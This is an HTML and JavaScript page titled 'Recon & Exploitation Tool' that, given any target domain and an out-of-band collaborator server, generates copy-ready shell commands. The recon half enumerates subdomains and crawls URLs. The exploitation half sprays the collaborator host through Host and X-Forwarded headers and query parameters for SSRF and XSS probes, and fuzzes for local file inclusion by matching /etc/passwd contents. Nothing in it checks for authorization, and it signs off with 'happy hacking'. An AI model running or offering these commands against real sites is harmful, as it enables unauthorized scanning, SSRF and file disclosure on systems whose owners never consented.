<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Recon & Exploitation Tool</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    html,
    body {
      height: 100%;
      margin: 0;
      padding: 0;
      background: #000;
      color: #0f0;
      font-size: 16px;
      font-family: monospace;
    }

    .container-fluid {
      padding: 20px;
      height: 100%;
    }

    .column-box {
      height: calc(100vh - 80px);
      display: flex;
      flex-direction: column;
    }

    .output-box {
      flex: 1;
      overflow-y: auto;
      background-color: #000;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 12px;
      white-space: pre-wrap;
    }

    .form-control {
      background-color: #111;
      color: #0f0;
      border: 1px solid #0f0;
    }

    .colored-line {
      display: block;
    }

    h4,
    .form-label {
      color: #0f0;
    }

    button {
      margin-top: 10px;
    }

    footer {
      background-color: #f0f0f0;
      padding: 10px;
      text-align: center;
      color: black;
    }

    footer p:nth-child(2) {
      color: red;
      margin-top: 5px;
    }
  </style>
</head>

<body>
  <div class="container-fluid">
    <div class="row">
      <!-- Recon Column -->
      <div class="col-md-6 column-box">
        <h4>üîç Recon Commands</h4>
        <label for="target" class="form-label">Target Domain</label>
        <input type="text" class="form-control mb-2" id="target" placeholder="e.g. nasa.gov" />
        <button class="btn btn-primary mb-2" onclick="generateCommands('recon')">Generate</button>
        <div id="output-recon" class="output-box mb-2"></div>
        <button class="btn btn-success" onclick="copyToClipboard('recon')">Copy</button>
      </div>

      <!-- Exploitation Column -->
      <div class="col-md-6 column-box">
        <h4 class="mb-3">üí• Exploitation Commands</h4>

        <label for="target2" class="form-label">Target Domain</label>
        <input type="text" class="form-control mb-2" id="target2" placeholder="e.g. nasa.gov" />

        <label for="collaborator" class="form-label">Collaborator Server</label>
        <input type="text" class="form-control mb-3" id="collaborator" placeholder="e.g. abc123.oastify.com" />

        <button class="btn btn-danger mb-3" onclick="generateCommands('exploit')">Generate Exploitation
          Commands</button>

        <label class="form-label">Generated Exploitation Commands</label>
        <div id="output-exploit" class="output-box mb-2"
          style="height: 300px; overflow-y: scroll; background: #000; color: #f00; border: 1px solid #f00; padding: 12px; font-family: monospace; white-space: pre-wrap;">
        </div>

        <button class="btn btn-warning" onclick="copyToClipboard('exploit')">Copy Exploitation Commands</button>
      </div>

    </div>
  </div>



  <script>
    const baseReconCommands = `
# [----- (aceos@MIKE) - [~hacking-commands]
$ subfinder -d {{TARGET}} -all -recursive | tee subfinder.txt
$ shodanx subdomain -d {{TARGET}} -o shodanx.txt
$ assetfinder --subs-only {{TARGET}} | grep "\.{{TARGET}}" | tee -a assertfinder.txt
$ amass enum -active -norecursive -d {{TARGET}} | grep "\.{{TARGET}}" | awk '{print $1}' | tee amass.txt
$ gobuster dns -d {{TARGET}} -w /mnt/d/Downloads/Documents/subdomain_megalist.txt -o gobuster_temp.txt
$ cat gobuster_temp.txt | awk '{print $2}' | tee gobuster.txt
$ rm gobuster_temp.txt
$ cat subfinder.txt amass.txt shodanx.txt assertfinder.txt gobuster.txt | sort -u | tee -a subs_{{TARGET}}.txt
$ curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/{{TARGET}}/passive_dns" | jq -r '.passive_dns[]?.hostname' | sort -u | tee -a alienvault_subs.txt
$ curl -s "https://urlscan.io/api/v1/search/?q=domain:{{TARGET}}&size=10000" | jq -r '.results[]?.page?.domain' | sort -u | tee urlscan_subs.txt
$ cat subs_{{TARGET}}.txt alienvault_subs.txt urlscan_subs.txt subfinder.txt | sort -u | tee all_subs_{{TARGET}}.txt
$ httpx -l all_subs_{{TARGET}}.txt -td -title -sc -ip -threads 200 -o httpx_{{TARGET}}.txt
$ cat httpx_{{TARGET}}.txt | grep -Ei 'old|asp|php|jsp|jspx|aspx' | tee subs-commonly-wth-vulns.txt
$ cat httpx_{{TARGET}}.txt | awk '{print $1}' | tee hosts_alive.txt
$ cat hosts_alive.txt | grep -E "admin|panel|portal|secure|dashboard|internal|api" | tee important_subdomains.txt
$ waymore -i {{TARGET}} -mode U -oU waymore.txt
$ cat hosts_alive.txt | gau | tee gaurls.txt
$ cat hosts_alive.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o gauplus.txt
$ cat hosts_alive.txt | katana -d 5 | tee katana.txt
$ cat gauplus.txt gaurls.txt katana.txt | anew all{{TARGET}}urls.txt
$  cat all{{TARGET}}urls.txt | gf base64 >> tee base64.txt
$ cat all{{TARGET}}urls.txt | grep -E "redirect=|url=|next=|return=" | tee open_redirect_params.txt
$ cat all{{TARGET}}urls.txt | grep -oE '(/|https?://)[^"]+\.js' | anew jsfiles.txt
$ nuclei -l hosts_alive.txt -t ~/nuclei-templates/ -severity critical,high,medium,low | tee nuclei.txt
$ nuclei -t ~/nuclei-templates/cves/ -list hosts_alive.txt | tee cves.txt
    `.trim();

    const baseExploitationCommands = `
$ subzy run --targets subexample.coms.txt --concurrency 100 --hide_fails --verify_ssl
$ cat hosts_alive.txt | xargs -I % curl -I % -H "Host: {{COLLAB}}" -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host=target.com;proto=https"
$ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host=target.com;proto=https"    
$ cat all{{TARGET}}urls.txt | grep "=" | qsreplace {{COLLAB}} | httpx
$ cat all{{TARGET}}urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
$ cat hosts_alive.txt | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: {{COLLAB}}'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: {{COLLAB}}'|grep xss) xss3=$(curl -s -L $url -H 'Host: {{COLLAB}}'|grep xss) xss4=$(curl -s -L $url --request-target http://{{COLLAB}}/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://{{COLLAB}} HTTP/1.1 ""\n";done
$ sif -d {{TARGET}}


    `.trim();





    function getRandomColor() {
      const colors = ['#0ff', '#0f0', '#f0f', '#ff0', '#0cf', '#fc0', '#c0f', '#0fa'];
      return colors[Math.floor(Math.random() * colors.length)];
    }

    function generateCommands(type) {
      const inputId = type === 'recon' ? 'target' : 'target2';
      const outputId = 'output-' + type;
      const target = document.getElementById(inputId).value.trim();

      if (!target) {
        alert("Please enter a target domain.");
        return;
      }

      let collaborator = "";
      if (type === 'exploit') {
        collaborator = document.getElementById("collaborator").value.trim();
        if (!collaborator) {
          alert("Please enter a collaborator server.");
          return;
        }
      }

      const base = type === 'recon' ? baseReconCommands : baseExploitationCommands;
      const outputDiv = document.getElementById(outputId);
      outputDiv.innerHTML = '';

      const replaced = base
        .replaceAll("{{TARGET}}", target)
        .replaceAll("{{COLLAB}}", collaborator);

      const lines = replaced.split("\n");
      let prevColor = null;

      lines.forEach(line => {
        let color;
        do {
          color = getRandomColor();
        } while (color === prevColor);
        prevColor = color;

        const span = document.createElement("span");
        span.className = "colored-line";
        span.style.color = color;
        span.textContent = line;
        outputDiv.appendChild(span);
      });
    }
    function copyToClipboard(type) {
      const outputId = type === 'recon' ? 'output-recon' : 'output-exploit';
      const button = type === 'recon'
        ? document.querySelector('.btn-success')
        : document.querySelector('.btn-warning');

      const text = document.getElementById(outputId).innerText;

      // Remove '$ ' from the beginning of each line before copying
      const cleanedText = text
        .split('\n')
        .map(line => line.startsWith('$ ') ? line.slice(2) : line)
        .join('\n');

      navigator.clipboard.writeText(cleanedText)
        .then(() => {
          const originalText = button.textContent;
          button.textContent = 'Copied! happy hacking üòÅü§°';
          setTimeout(() => {
            button.textContent = originalText;
          }, 2000);
        })
        .catch(() => alert("Failed to copy!"));
    }




  </script>

</body>

</html>
